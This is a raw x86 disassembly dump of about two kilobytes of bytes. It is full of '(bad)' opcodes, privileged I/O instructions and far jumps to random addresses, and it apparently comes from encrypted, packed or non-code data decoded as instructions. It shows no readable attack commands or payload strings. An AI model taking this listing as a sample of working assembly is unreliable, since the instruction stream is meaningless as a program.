  41d592:	in     al,dx
  41d593:	aam    0xe9
  41d595:	in     al,0xfd
  41d597:	mov    ebp,0xf6eefaf1
  41d59c:	not    esp
  41d59e:	add    edi,esi
  41d5a0:	call   0xea3dada8
  41d5a5:	(bad)  
  41d5a7:	(bad)  
  41d5a9:	(bad)
  41d5ad:	ret    0xd3b3
  41d5b0:	mov    edx,0xd9c8c9b2
  41d5b5:	mov    dl,0xd6
  41d5b7:	cli    
  41d5b8:	push   ecx
  41d5ba:	idiv   bl
  41d5bc:	sti    
  41d5bd:	inc    DWORD PTR [edi]
  41d5bf:	lock add al,BYTE PTR ds:0xc07c5f7
  41d5c6:	or     edi,esp
  41d5c8:	repz shl ebp,0xd2
  41d5cc:	(bad)  
  41d5cd:	int    0xd5
  41d5cf:	loopne 0x41d5bd
  41d5d1:	sar    esi,cl
  41d5d3:	(bad)  
  41d5d5:	in     al,dx
  41d5d6:	int3   
  41d5d7:	in     al,dx
  41d5d8:	std    
  41d5d9:	(bad)  
  41d5da:	shl    eax,1
  41d5dc:	fiadd  DWORD PTR [edx]
  41d5de:	add    dh,bh
  41d5e0:	jmp    0xfb51b9e1
  41d5e5:	fiadd  WORD PTR [ebx+edx*8]
  41d5e8:	into   
  41d5e9:	int    0xbc
  41d5eb:	repz retf 
  41d5ed:	in     eax,dx
  41d5ee:	(bad)  
  41d5ef:	mov    cl,0xc7
  41d5f1:	xlat   BYTE PTR ds:[ebx]
  41d5f2:	mov    ch,0xe6
  41d5f4:	enter  0xd3eb,0xfd
  41d5f8:	mov    eax,0xf5c0c2f8
  41d5fd:	aam    0xe4
  41d5ff:	add    eax,0xf6e7c8d4
  41d604:	aad    0xf8
  41d606:	in     eax,dx
  41d607:	pop    es
  41d608:	iret   
  41d609:	jecxz  0x41d5b7
  41d60b:	jmp    0xb811bee2
  41d610:	idiv   DWORD PTR [ecx-0xd102e25]
  41d616:	aam    0xde
  41d618:	shl    bl,1
  41d61a:	(bad)  
  41d61c:	xlat   BYTE PTR ds:[ebx]
  41d61d:	add    eax,DWORD PTR [edi]
  41d61f:	add    edi,edi
  41d621:	or     ebx,esi
  41d623:	cld    
  41d624:	in     eax,dx
  41d625:	add    eax,0xaceadcea
  41d62a:	rol    edx,cl
  41d62c:	ret    
  41d62d:	shr    al,1
  41d62f:	(bad)
  41d632:	cmc    
  41d633:	repz fincstp 
  41d636:	lock div cl
  41d639:	repnz lock clc 
  41d63c:	rcr    ecx,0xf1
  41d63f:	stc    
  41d640:	loop   0x41d640
  41d642:	hlt    
  41d643:	add    cl,BYTE PTR [esi]
  41d645:	leave  
  41d646:	jmp    0x41d64e
  41d648:	stos   DWORD PTR es:[edi],eax
  41d649:	(bad)  [eax-0x173b5224]
  41d64f:	mov    bl,0xc9
  41d651:	mov    ch,0xca
  41d653:	stc    
  41d654:	(bad)  
  41d656:	inc    DWORD PTR [ecx]
  41d658:	mov    edi,0x1fae2db
  41d65d:	add    al,0x7
  41d65f:	cli    
  41d660:	test   cl,0x9
  41d663:	loope  0x41d66e
  41d665:	or     eax,0xbff305e4
  41d66a:	jmp    0xced9:0xb2c7c2e8
  41d671:	enter  0xede7,0xfe
  41d675:	cli    
  41d676:	into   
  41d677:	loop   0x41d632
  41d679:	shr    bh,cl
  41d67b:	icebp  
  41d67c:	hlt    
  41d67d:	add    al,0xc2
  41d67f:	out    0xf7,eax
  41d681:	loope  0x41d678
  41d683:	in     eax,0xe7
  41d685:	or     ch,cl
  41d687:	push   es
  41d688:	jmp    0xecf4:0xd2ebd2f0
  41d68f:	test   edi,0xf8b8dbf4
  41d695:	(bad)  
  41d696:	shl    al,1
  41d698:	loop   0x41d67d
  41d69a:	shl    ah,cl
  41d69c:	inc    dh
  41d69e:	stc    
  41d69f:	rcr    ebp,1
  41d6a1:	rol    BYTE PTR [eax],1
  41d6a3:	cmc    
  41d6a4:	dec    DWORD PTR [edx]
  41d6a6:	or     ecx,ebp
  41d6a8:	mov    bl,0xe4
  41d6aa:	(bad)  
  41d6ab:	in     al,dx
  41d6ac:	scas   eax,DWORD PTR es:[edi]
  41d6ad:	int    0xd5
  41d6af:	vshufps xmm1,xmm6,xmm4,0xc9
  41d6b4:	repz lock fldz 
  41d6b8:	enter  0xf4fe,0xd2
  41d6bc:	loop   0x41d690
  41d6be:	retf   
  41d6bf:	jmp    0x41d6ac
  41d6c1:	out    0xfd,al
  41d6c3:	fmul   st(0),st
  41d6c5:	or     esp,edi
  41d6c7:	paddsw mm0,mm1
  41d6ca:	not    bh
  41d6cc:	lock repz shl BYTE PTR [ecx-0x3a311046],1
  41d6d4:	iret   
  41d6d5:	out    dx,eax
  41d6d6:	mov    cl,0xf7
  41d6d8:	(bad)  
  41d6d9:	std    
  41d6da:	inc    ebx
  41d6dc:	stc    
  41d6dd:	add    esp,ebx
  41d6df:	jmp    0x908ade2
  41d6e4:	or     ch,al
  41d6e6:	stc    
  41d6e7:	shl    BYTE PTR [edi-0x303a5a16],0xe4
  41d6ee:	iret   
  41d6ef:	shl    BYTE PTR [ecx-0x73a4e11],1
  41d6f5:	mov    dl,0xf9
  41d6f7:	repz cld 
  41d6f9:	mov    edx,0xfbbcf8fe
  41d6fe:	(bad)  
  41d6ff:	out    0xc4,eax
  41d701:	fld    DWORD PTR [ecx]
  41d703:	out    dx,eax
  41d704:	cli    
  41d705:	(bad)  
  41d706:	repz out 0xeb,eax
  41d709:	jmp    0xc62bb5dc
  41d70e:	shl    edi,0xc7
  41d711:	shr    bl,1
  41d713:	out    dx,al
  41d714:	int    0xd9
  41d716:	icebp  
  41d717:	ret    
  41d718:	xlat   BYTE PTR ds:[ebx]
  41d719:	hlt    
  41d71a:	out    0xd3,eax
  41d71c:	fcompp 
  41d71e:	aad    0xe9
  41d720:	retf   
  41d721:	add    esi,edx
  41d723:	xabort 0xed
  41d726:	(bad)
  41d729:	mov    al,0xd2
  41d72b:	ret    
  41d72c:	jmp    0x41d6ff
  41d72e:	icebp  
  41d72f:	out    0xf0,al
  41d731:	in     eax,0xd4
  41d733:	(bad)  
  41d735:	out    dx,eax
  41d736:	cli    
  41d737:	int    0xd6
  41d739:	lock mov ch,0xf3
  41d73c:	pop    es
  41d73d:	(bad)  
  41d73e:	cli    
  41d73f:	shl    al,1
  41d741:	fsubr  st,st(1)
  41d743:	(bad)  
  41d745:	fucomp st(0)
  41d747:	pslld  mm6,QWORD PTR [eax-0x342f3312]
  41d74e:	lds    edi,FWORD PTR [edx-0x15132938]
  41d754:	in     al,0xd7
  41d756:	add    ebx,esp
  41d758:	hlt    
  41d759:	out    dx,eax
  41d75a:	(bad)  
  41d75b:	sti    
  41d75c:	rcr    ch,0xfc
  41d75f:	fcomp  st(7)
  41d761:	cmc    
  41d762:	(bad)  
  41d763:	cld    
  41d764:	(bad)  
  41d766:	in     al,0x0
  41d768:	sar    BYTE PTR [edi-0x43370f0e],cl
  41d76e:	ret    
  41d76f:	mov    bh,0xc0
  41d771:	mov    eax,0xd9ddb8ec
  41d776:	cli    
  41d777:	loope  0x41d765
  41d779:	add    ebp,edi
  41d77b:	loopne 0x41d77f
  41d77d:	in     eax,0xb9
  41d77f:	add    eax,0xd0ae701
  41d784:	iret   
  41d785:	int3   
  41d786:	out    0xec,eax
  41d788:	lods   eax,DWORD PTR ds:[esi]
  41d789:	lock scas al,BYTE PTR es:[edi]
  41d78b:	mov    dh,0xae
  41d78d:	(bad)  
  41d78e:	(bad)  
  41d78f:	ror    esp,cl
  41d791:	icebp  
  41d792:	mov    edx,0xd8d9f0ac
  41d797:	out    dx,eax
  41d798:	xlat   BYTE PTR ds:[ebx]
  41d799:	call   0xe709b28a
  41d79e:	loopne 0x41d7a1
  41d7a0:	add    dh,al
  41d7a2:	loopne 0x41d778
  41d7a4:	out    0xda,al
  41d7a6:	jmp    0xcce3:0xf3cfcaea
  41d7ad:	stos   BYTE PTR es:[edi],al
  41d7ae:	mov    ah,0xb6
  41d7b0:	out    dx,al
  41d7b1:	hlt    
  41d7b2:	lock mov eax,0xe8bab5f5
  41d7b8:	repnz in eax,dx
  41d7ba:	cld    
  41d7bb:	pop    es
  41d7bc:	xlat   BYTE PTR ds:[ebx]
  41d7bd:	(bad)  
  41d7bf:	mov    eax,0xfe00ffc0
  41d7c4:	pop    es
  41d7c5:	jmp    0xbcbe:0xf3afdee6
  41d7cc:	mov    ch,0xd2
  41d7ce:	mov    al,0xed
  41d7d0:	clc    
  41d7d1:	int3   
  41d7d2:	div    DWORD PTR [edi-0xd273618]
  41d7d8:	loope  0x41d7ba
  41d7da:	mov    eax,0xf2f807f4
  41d7df:	(bad)  
  41d7e0:	leave  
  41d7e1:	shl    esi,0xe1
  41d7e4:	sti    
  41d7e5:	in     al,dx
  41d7e6:	jmp    0xdf39baf3
  41d7eb:	out    0xd4,eax
  41d7ed:	retf   0xf4eb
  41d7f0:	cmc    
  41d7f1:	jmp    0xd21ad1c1
  41d7f6:	mov    edx,0xfdefb7ce
  41d7fb:	fidivr WORD PTR [edi-0x1904fa02]
  41d801:	jmp    0xadd:0xd4e6c8fb
  41d808:	mov    cl,0xe5
  41d80a:	out    dx,eax
  41d80b:	xlat   BYTE PTR ds:[ebx]
  41d80c:	(bad)  
  41d80d:	in     eax,0xca
  41d80f:	leave  
  41d810:	iret   
  41d811:	jmp    0xf303:0x3cab4d7
  41d818:	mov    edi,0xd8e6d7de
  41d81d:	shl    bh,cl
  41d81f:	aad    0xd7
  41d821:	lock loope 0x41d7f2
  41d824:	(bad)  
  41d825:	enter  0x9c9,0xcf
  41d829:	test   al,0xe5
  41d82b:	scas   eax,DWORD PTR es:[edi]
  41d82c:	(bad)  
  41d82d:	stos   BYTE PTR es:[edi],al
  41d82e:	ret    0xccc0
  41d831:	mov    eax,0xb8d5f5cf
  41d836:	ror    eax,1
  41d838:	(bad)  
  41d839:	(bad)  
  41d83b:	rol    BYTE PTR [edx+edi*4],cl
  41d83e:	loop   0x41d836
  41d840:	rol    BYTE PTR [ebx],1
  41d842:	clc    
  41d843:	fsubr  st(3),st
  41d845:	call   0xc32e9928
  41d84a:	loop   0x41d834
  41d84c:	shl    ebp,1
  41d84e:	vpxor  xmm4,xmm5,xmm5
  41d852:	mov    edx,0xfff1e5eb
  41d857:	aam    0x1
  41d859:	xlat   BYTE PTR ds:[ebx]
  41d85a:	rcr    edx,0xd5
  41d85d:	stc    
  41d85e:	cli    
  41d85f:	in     al,0xc6
  41d861:	in     al,0xf7
  41d863:	ftst   
  41d865:	hlt    
  41d866:	std    
  41d867:	icebp  
  41d868:	mov    dl,0xa8
  41d86a:	jmp    0x41d819
  41d86c:	retf   
  41d86d:	sti    
  41d86e:	int3   
  41d86f:	enter  0xb7cc,0xd3
  41d873:	(bad)  
  41d874:	mov    edx,0xe9dac9cf
  41d879:	shl    edx,cl
  41d87b:	repz idiv BYTE PTR [ebp-0x35171630]
  41d882:	inc    DWORD PTR [esi]
  41d884:	enter  0x5fe,0xda
  41d888:	jmp    0x41d873
  41d88a:	lods   eax,DWORD PTR ds:[esi]
  41d88b:	cmc    
  41d88c:	mov    cl,0xc8
  41d88e:	rcl    bl,cl
  41d890:	loopne 0x41d840
  41d892:	leave  
  41d893:	out    dx,al
  41d894:	retf   
  41d895:	mov    ah,0xcd
  41d897:	mov    edx,0xf2d4bcff
  41d89c:	(bad)  
  41d89d:	fcmovnb st,st(3)
  41d89f:	stc    
  41d8a0:	(bad)  
  41d8a4:	clc    
  41d8a5:	retf   0x13e2
  41d8a8:	stos   DWORD PTR es:[edi],eax
  41d8a9:	retf   
  41d8aa:	icebp  
  41d8ab:	out    dx,eax
  41d8ac:	iret   
  41d8ad:	in     al,dx
  41d8ae:	fucompp 
  41d8b0:	div    BYTE PTR [esi+edx*8-0x1021314]
  41d8b7:	aad    0xdc
  41d8b9:	xlat   BYTE PTR ds:[ebx]
  41d8ba:	xlat   BYTE PTR ds:[ebx]
  41d8bb:	hlt    
  41d8bc:	cmc    
  41d8bd:	(bad)
  41d8c0:	fneni(8087 only) 
  41d8c2:	xlat   BYTE PTR ds:[ebx]
  41d8c3:	add    DWORD PTR ds:0xc00eccf3,eax
  41d8c9:	loop   0x41d8b7
  41d8cb:	lods   al,BYTE PTR ds:[esi]
  41d8cc:	out    0xe6,eax
  41d8ce:	out    dx,al
  41d8cf:	lods   al,BYTE PTR ds:[esi]
  41d8d0:	into   
  41d8d1:	mov    edx,0xf0e9bad4
  41d8d6:	mov    ch,0xe8
  41d8d8:	aad    0xf3
  41d8da:	ror    ebp,cl
  41d8dc:	ret    
  41d8dd:	lock hlt 
  41d8df:	(bad)  
  41d8e0:	jecxz  0x41d8c9
  41d8e2:	(bad)  
  41d8e3:	push   cs
  41d8e4:	loopne 0x41d8a8
  41d8e6:	in     al,dx
  41d8e7:	add    al,0xd0
  41d8e9:	ret    0xb6de
  41d8ec:	retf   0xf1c4
  41d8ef:	(bad)  
  41d8f0:	call   0xcf31b7c9
  41d8f5:	out    dx,al
  41d8f6:	neg    cl
  41d8f8:	fchs   
  41d8fa:	loope  0x41d901
  41d8fc:	mov    esp,0xf7fbeaf2
  41d901:	loopne 0x41d8e4
  41d903:	jmp    0x41d8cd
  41d905:	fcmovnu st,st(5)
  41d907:	ror    esp,cl
  41d909:	test   al,0xf6
  41d90b:	jecxz  0x41d8e0
  41d90d:	jmp    0x41d8f8
  41d90f:	xlat   BYTE PTR ds:[ebx]
  41d910:	sar    BYTE PTR [ebx-0x213b0416],0xfc
  41d917:	aam    0xf7
  41d919:	int    0xbe
  41d91b:	add    bh,BYTE PTR [ebp+esi*8-0x2104fb2d]
  41d922:	cmc    
  41d923:	aam    0xf8
  41d925:	out    dx,eax
  41d926:	sti    
  41d927:	int3   
  41d928:	in     al,0xc7
  41d92a:	loope  0x41d8d9
  41d92c:	rol    dh,cl
  41d92e:	out    0xca,eax
  41d930:	mov    bl,0xf2
  41d932:	(bad)  
  41d933:	in     al,0xfd
  41d935:	jmp    0xf90eac17
  41d93a:	ret    0xc6ed
  41d93d:	mov    esi,0xf4e0e6bd
  41d942:	stc    
  41d943:	out    dx,al
  41d944:	cmc    
  41d945:	add    bl,bh
  41d947:	loope  0x41d93c
  41d949:	scas   al,BYTE PTR es:[edi]
  41d94a:	loope  0x41d932
  41d94c:	out    dx,al
  41d94d:	out    dx,al
  41d94e:	mov    cl,0xcf
  41d950:	cli    
  41d951:	out    0xb9,eax
  41d953:	in     eax,0xc4
  41d955:	(bad)  
  41d957:	mov    eax,0xdc01f0f8
  41d95c:	out    0xff,eax
  41d95e:	jmp    0xf8c9:0x7f901fe
  41d965:	fdivp  st(2),st
  41d967:	fbld   TBYTE PTR [edi-0x3b384242]
  41d96d:	cmc    
  41d96e:	mov    ebx,0xd6cfbbc9
  41d973:	div    BYTE PTR [ebx-0x453d0716]
  41d979:	in     eax,dx
  41d97a:	std    
  41d97b:	lock add dh,dh
  41d97e:	jecxz  0x41d94a
  41d980:	or     ecx,ecx
  41d982:	fisttp QWORD PTR ds:0xadeddeb
  41d988:	mov    esp,0xe0f0e7d8
  41d98d:	cmc    
  41d98e:	loopne 0x41d984
  41d990:	cmc    
  41d991:	rol    ebp,cl
  41d993:	frndint 
  41d995:	mov    edi,0xced9e9bc
  41d99a:	add    al,BYTE PTR [eax]
  41d99c:	div    bh
  41d99e:	or     cl,BYTE PTR [ebx]
  41d9a0:	loop   0x41d985
  41d9a2:	fucomip st,st(3)
  41d9a4:	fcmovu st,st(4)
  41d9a6:	int    0xfe
  41d9a8:	stos   DWORD PTR es:[edi],eax
  41d9a9:	lods   eax,DWORD PTR ds:[esi]
  41d9aa:	lods   al,BYTE PTR ds:[esi]
  41d9ab:	leave  
  41d9ac:	lock ret 0xc4c3
  41d9b0:	fmul   st,st(4)
  41d9b2:	stc    
  41d9b3:	int3   
  41d9b4:	fdiv   QWORD PTR [esi+0xd1ba02]
  41d9ba:	add    esi,esi
  41d9bc:	in     eax,dx
  41d9bd:	mov    esi,0xfee0dcdc
  41d9c2:	out    dx,al
  41d9c3:	mov    esp,0x110feac9
  41d9c8:	test   eax,0xcdc9e5cc
  41d9cd:	hlt    
  41d9ce:	sti    
  41d9cf:	loopne 0x41d9ac
  41d9d1:	shl    edi,1
  41d9d3:	retf   0xddef
  41d9d6:	out    dx,eax
  41d9d7:	fadd   st,st(3)
  41d9d9:	iret   
  41d9da:	clc    
  41d9db:	(bad)  
  41d9dc:	fld    QWORD PTR [edi]
  41d9de:	add    esp,edx
  41d9e0:	(bad)  
  41d9e2:	(bad)  
  41d9e3:	jmp    0x41d9ed
  41d9e5:	out    0xe5,eax
  41d9e7:	loopne 0x41d99b
  41d9e9:	mov    dl,0xf0
  41d9eb:	mov    al,0xe4
  41d9ed:	xlat   BYTE PTR ds:[ebx]
  41d9ee:	in     eax,0xc6
  41d9f0:	in     eax,0xd4
  41d9f2:	cli    
  41d9f3:	mov    edi,0xffbacdd8
  41d9f8:	into   
  41d9f9:	cmc    
  41d9fa:	loope  0x41d9be
  41d9fc:	add    bh,BYTE PTR [ebx+eax*8-0x9f90e16]
  41da03:	fdiv   st(0),st
  41da05:	in     al,0xb
  41da07:	pop    gs
  41da09:	ror    cl,1
  41da0b:	lds    ebp,FWORD PTR [ebx-0x5342a16]
  41da11:	in     al,dx
  41da12:	fsubp  st(4),st
  41da14:	mov    ebx,0xbdbccfb4
  41da19:	clc    
  41da1a:	into   
  41da1b:	cmc    
  41da1c:	ret    0xf7c2
  41da1f:	rol    DWORD PTR [edi+eax*8],0xdb
  41da23:	cld    
  41da24:	(bad)  
  41da25:	(bad)  
  41da26:	out    dx,eax
  41da27:	fldl2e 
  41da29:	mov    cl,0xac
  41da2b:	shl    esi,0xf1
  41da2e:	shr    DWORD PTR [eax-0x4b47244a],1
  41da34:	mov    ah,0xf1
  41da36:	enter  0xbcc2,0xd8
  41da3a:	add    dl,ah
  41da3c:	xlat   BYTE PTR ds:[ebx]
  41da3d:	sti    
  41da3e:	or     dl,bh
  41da40:	std    
  41da41:	add    DWORD PTR [esi],eax
  41da43:	jmp    0xfb39e154
  41da48:	bnd ret 0xefbd
  41da4c:	sar    DWORD PTR [ebp+eiz*8-0x4a461a25],cl
  41da53:	aam    0xfc
  41da55:	sar    BYTE PTR [edi+0x3d8bbc3],cl
  41da5b:	aam    0xf8
  41da5d:	mov    ebp,0xf7f4bcf5
  41da62:	sti    
  41da63:	out    dx,eax
  41da64:	iret   
  41da65:	add    ah,ah
  41da67:	shl    edx,cl
  41da69:	iret   
  41da6a:	in     al,dx
  41da6b:	test   al,0xcb
  41da6d:	in     al,0xd3
  41da6f:	fcmovbe st,st(5)
  41da71:	jmp    0xf730ba2e
  41da76:	aam    0xd6
  41da78:	into   
  41da79:	mov    edi,0xfac1d7fb
  41da7e:	mov    ecx,0xdc0ac1e6
  41da83:	in     eax,dx
  41da84:	fadd   st,st(4)
  41da86:	adc    ah,dl
  41da88:	mov    esp,0xefcce2c3
  41da8d:	loop   0x41da3f
  41da8f:	repnz scas eax,DWORD PTR es:[edi]
  41da91:	int    0xb1
  41da93:	jmp    0xf830d64b
  41da98:	shl    edi,1
  41da9a:	repz mov esp,0xebfcd2d7
  41daa0:	fcmovu st,st(0)
  41daa2:	ffree  st(7)
  41daa4:	pop    es
  41daa5:	in     eax,dx
  41daa6:	add    al,0xe2
  41daa8:	sar    BYTE PTR [eax+esi*4-0x35091954],1
  41daaf:	jmp    0x41da77
  41dab1:	mov    ch,0xed
  41dab3:	rcl    ch,cl
  41dab5:	(bad)  
  41dab6:	in     al,dx
  41dab7:	sar    DWORD PTR [edi+0xddf5cc],cl
  41dabd:	loope  0x41dac2
  41dabf:	cli    
  41dac0:	les    ecx,FWORD PTR [edi]
  41dac2:	jmp    0x50fc495
  41dac7:	int3   
  41dac8:	rcr    ah,1
  41daca:	idiv   DWORD PTR [ecx+ebp*8-0x104f2b17]
  41dad1:	into   
  41dad2:	shl    DWORD PTR [esp+esi*4+0x2d7f1ee],1
  41dad9:	fcomp  st(5)
  41dadb:	neg    dh
  41dadd:	mov    esi,0x3e6e6e0
  41dae2:	enter  0xee1,0xcb
  41dae6:	int3   
  41dae7:	repz mov esp,0xd2d5ecc4
  41daed:	shl    ah,cl
  41daef:	shl    esp,cl
  41daf1:	shl    BYTE PTR [eax-0x4e084b0b],cl
  41daf7:	mov    eax,0x7fbcff3
  41dafc:	dec    esp
  41dafe:	lock jmp 0x41dae4
  41db01:	clc    
  41db02:	in     al,0xe4
  41db04:	jmp    0xb021a6f2
  41db09:	icebp  
  41db0a:	ret    0xf6a4
  41db0d:	mov    cl,0xc5
  41db0f:	mov    dh,0xb9
  41db11:	enter  0xf8f9,0xe4
  41db15:	std    
  41db16:	out    dx,al
  41db17:	aam    0xf3
  41db19:	shl    dl,1
  41db1b:	fld    DWORD PTR [eax]
  41db1d:	fadd   st(5),st
  41db1f:	cli    
  41db20:	rcr    dl,1
  41db22:	iret   
  41db23:	add    eax,0xcbeb0e03
  41db28:	loope  0x41db16
  41db2a:	call   0xae2eabde
  41db2f:	in     eax,0xd7
  41db31:	out    dx,al
  41db32:	aad    0xe4
  41db34:	in     al,dx
  41db35:	cld    
  41db36:	rcr    eax,1
  41db38:	mov    esi,0xdff7fedc
  41db3d:	(bad)  
  41db3f:	fsubrp st(5),st
  41db41:	clc    
  41db42:	clc    
  41db43:	jmp    0x41db0c
  41db45:	add    al,0xc4
  41db47:	loopne 0x41db01
  41db49:	test   eax,0xc8aee0d0
  41db4e:	mov    ah,0xd5
  41db50:	out    dx,eax
  41db51:	scas   al,BYTE PTR es:[edi]
  41db52:	in     al,dx
  41db53:	mov    ebx,0xbbcbefda
  41db58:	loope  0x41db3a
  41db5a:	(bad)  
  41db5b:	in     eax,dx
  41db5c:	rcl    dl,cl
  41db5e:	sar    edi,cl
  41db60:	loopne 0x41db58
  41db62:	leave  
  41db63:	add    edi,eax
  41db65:	jmp    0x41db6f
  41db67:	pop    es
  41db68:	(bad)
  41db6b:	test   al,0xc9
  41db6d:	mov    bh,0xf4
  41db6f:	shr    ah,1
  41db71:	retf   
  41db72:	mov    cl,0xef
  41db74:	fidivr DWORD PTR [ebx-0x245422c]
  41db7a:	aad    0xd8
  41db7c:	mov    ebx,0xf6c2ebf4
  41db81:	add    eax,0x3e7e701
  41db86:	or     eax,DWORD PTR [edi]
  41db88:	in     al,0xd0
  41db8a:	loopne 0x41db7c
  41db8c:	loop   0x41db62
  41db8e:	int3   
  41db8f:	stc    
  41db90:	iret   
  41db91:	leave  
  41db92:	repnz clc 
  41db94:	(bad)  
  41db96:	(bad)  
  41db97:	in     al,dx
  41db98:	out    dx,eax
  41db99:	mov    dh,0xcd
  41db9b:	mov    eax,0xc7040bbc
  41dba0:	ret    
  41dba1:	cmc    
  41dba2:	leave  
  41dba3:	(bad)  
  41dba4:	loope  0x41dbaf
  41dba6:	pop    es
  41dba7:	add    ah,ah
  41dba9:	fucom  st(2)
  41dbab:	int3   
  41dbac:	rol    ah,0xea
  41dbaf:	enter  0xc9f2,0xad
  41dbb3:	sti    
  41dbb4:	(bad)  
  41dbb5:	in     al,0xd0
  41dbb7:	cld    
  41dbb8:	(bad)  
  41dbb9:	fcmovbe st,st(0)
  41dbbb:	add    eax,0xe3eabcc3
  41dbc0:	(bad)  
  41dbc2:	clc    
  41dbc3:	add    eax,DWORD PTR [edi]
  41dbc5:	add    eax,0xc2b208e9
  41dbca:	(bad)  
  41dbcc:	mul    dh
  41dbce:	shr    ecx,cl
  41dbd0:	(bad)  
  41dbd2:	sti    
  41dbd3:	(bad)
  41dbd6:	(bad)  
  41dbd8:	xlat   BYTE PTR ds:[ebx]
  41dbd9:	mov    eax,0xc4d8c1f5
  41dbde:	rol    edx,cl
  41dbe0:	shl    eax,0xa
  41dbe3:	inc    BYTE PTR [eax]
  41dbe5:	(bad)  
  41dbe6:	ror    ebx,cl
  41dbe8:	in     al,dx
  41dbe9:	scas   eax,DWORD PTR es:[edi]
  41dbea:	mov    cl,0xbc
  41dbec:	mov    esp,0xd3dacaf6
  41dbf1:	mov    ah,0xd6
  41dbf3:	jmp    0x3ff:0xf5dbfacc
  41dbfa:	into   
  41dbfb:	pop    es
  41dbfc:	add    eax,DWORD PTR [ebx]
  41dbfe:	add    DWORD PTR [edx],ecx
  41dc00:	ret    0x4be
  41dc03:	call   0xfa3ec8eb
  41dc08:	call   0xc7ef9db7
  41dc0d:	jmp    0xe81ca7f8
  41dc12:	retf   0xb9eb
  41dc15:	jmp    0x41dc0a
  41dc17:	not    bh
  41dc19:	inc    dl
  41dc1b:	lock stc 
  41dc1d:	fcmove st,st(3)
  41dc1f:	lock add al,0xde
  41dc22:	out    0xf6,eax
  41dc24:	jmp    0xb0229d38
  41dc29:	shr    ebp,1
  41dc2b:	jmp    0x41dbdf
  41dc2d:	iret   
  41dc2e:	div    bl
  41dc30:	mov    ah,0xc5
  41dc32:	mov    ebx,0xd2dcc9f0
  41dc37:	aam    0xef
  41dc39:	repnz (bad) 
  41dc3b:	mov    esp,0xc1ebd2d8
  41dc40:	leave  
  41dc41:	pxor   mm5,mm5
  41dc44:	or     ebp,ebx
  41dc46:	int3   
  41dc47:	adc    esp,esp
  41dc49:	icebp  
  41dc4a:	rol    bh,0xd2
  41dc4d:	int3   
  41dc4e:	hlt    
  41dc4f:	sti    
  41dc50:	clc    
  41dc51:	(bad)  
  41dc52:	clc    
  41dc53:	mov    eax,0xe2d4cce5
  41dc58:	in     eax,dx
  41dc59:	repnz rol BYTE PTR [edx],0x6
  41dc5d:	add    edi,edi
  41dc5f:	sar    ebx,0xfd
  41dc62:	jecxz  0x41dc3d
  41dc64:	enter  0xdbed,0x6
  41dc68:	retf   0xc2de
  41dc6b:	lds    ebp,FWORD PTR [ecx+eax*8-0x4d1a2f0d]
  41dc72:	sti    
  41dc73:	idiv   BYTE PTR [eax-0x201e03fd]
  41dc79:	ror    dh,1
  41dc7b:	out    0xd7,eax
  41dc7d:	cmc    
  41dc7e:	jecxz  0x41dc75
  41dc80:	push   es
  41dc81:	(bad)  
  41dc82:	stc    
  41dc83:	add    bl,ah
  41dc85:	iret   
  41dc86:	add    BYTE PTR [ebx+eax*8],al
  41dc89:	lods   eax,DWORD PTR ds:[esi]
  41dc8a:	test   bl,0xe2
  41dc8d:	shl    esi,0xf0
  41dc90:	into   
  41dc91:	shr    esi,1
  41dc93:	int3   
  41dc94:	int    0xce
  41dc96:	std    
  41dc97:	loop   0x41dc8b
  41dc99:	loopne 0x41dc7b
  41dc9b:	(bad)  
  41dc9c:	sti    
  41dc9d:	push   es
  41dc9e:	fadd   st(6),st
  41dca0:	add    BYTE PTR ds:0xccede909,al
  41dca6:	fsubr  st,st(4)
  41dca8:	rcl    al,0xc1
  41dcab:	retf   
  41dcac:	(bad)  
  41dcad:	in     al,dx
  41dcae:	rol    esp,0xe4
  41dcb1:	cli    
  41dcb2:	hlt    
  41dcb3:	mov    ah,0xb9
  41dcb5:	lock mov ebp,0xe7ffc1c9
  41dcbb:	stc    
  41dcbc:	not    bl
  41dcbe:	loopne 0x41dccb
  41dcc0:	or     ebp,edx
  41dcc2:	(bad)  
  41dcc3:	out    dx,al
  41dcc4:	push   cs
  41dcc5:	in     al,dx
  41dcc6:	les    ecx,FWORD PTR [edi]
  41dcc8:	mov    esp,0xe7bddef2
  41dccd:	jmp    0xeaf8c9bf
  41dcd2:	into   
  41dcd3:	repnz clc 
  41dcd5:	mov    dh,0xc8
  41dcd7:	(bad)  
  41dcd8:	aad    0x7
  41dcda:	add    eax,esp
  41dcdc:	stc    
  41dcdd:	cli    
  41dcde:	cli    
  41dcdf:	or     edi,ebx
  41dce1:	fdivp  st(7),st
  41dce3:	sgdtd  [ecx]
  41dce6:	out    0xe3,al
  41dce8:	mov    esp,0xabb1d1dc
  41dced:	shr    DWORD PTR [ecx-0x132a250c],0xd1
  41dcf4:	mov    ah,0xf0
  41dcf6:	(bad)  
  41dcf8:	inc    eax
  41dcfa:	mov    eax,0x7e0e4bf
  41dcff:	aad    0x1
  41dd01:	shl    edx,0xb
  41dd04:	or     ah,dh
  41dd06:	push   cs
  41dd07:	pop    es
  41dd08:	mov    cl,0xcc
  41dd0a:	xlat   BYTE PTR ds:[ebx]
  41dd0b:	shl    esp,cl
  41dd0d:	out    0xcb,eax
  41dd0f:	hlt    
  41dd10:	retf   
  41dd11:	lock mov ch,0xd1
  41dd14:	mov    ch,0xf4
  41dd16:	in     eax,dx
  41dd17:	lock fadd DWORD PTR [ecx]
  41dd1a:	idiv   BYTE PTR [esi-0x20f40733]
  41dd20:	out    0xff,eax
  41dd22:	pop    es
  41dd23:	(bad)  
  41dd24:	loop   0x41dcf1
  41dd26:	jmp    0xd3e3:0xc0dceaf3
  41dd2d:	shl    DWORD PTR [ebp-0x1b15074c],1
  41dd33:	mov    ebx,0xf1b9f9fb
  41dd38:	xlat   BYTE PTR ds:[ebx]
  41dd39:	int    0xf2
  41dd3b:	add    dh,bh
  41dd3d:	(bad)  
  41dd3e:	cmc    
  41dd3f:	sar    bl,0xf0
  41dd42:	out    dx,al
  41dd43:	(bad)  
  41dd44:	fcmovne st,st(3)
  41dd46:	or     eax,0xceafe5ca
  41dd4b:	in     al,0xd7
  41dd4d:	out    dx,eax
  41dd4e:	(bad)  
  41dd4f:	jmp    0x41dd0c
  41dd51:	cli    
  41dd52:	fsubr  st,st(4)
  41dd54:	int    0xdd
  41dd56:	add    dl,ch
  41dd58:	(bad)  
  41dd59:	fild   WORD PTR [ebx]
  41dd5b:	clc    
  41dd5c:	sti    
  41dd5d:	hlt    
  41dd5e:	add    esp,edi
  41dd60:	rol    BYTE PTR [eax],1
  41dd62:	out    dx,al
  41dd63:	push   es
  41dd64:	fsubr  st(2),st
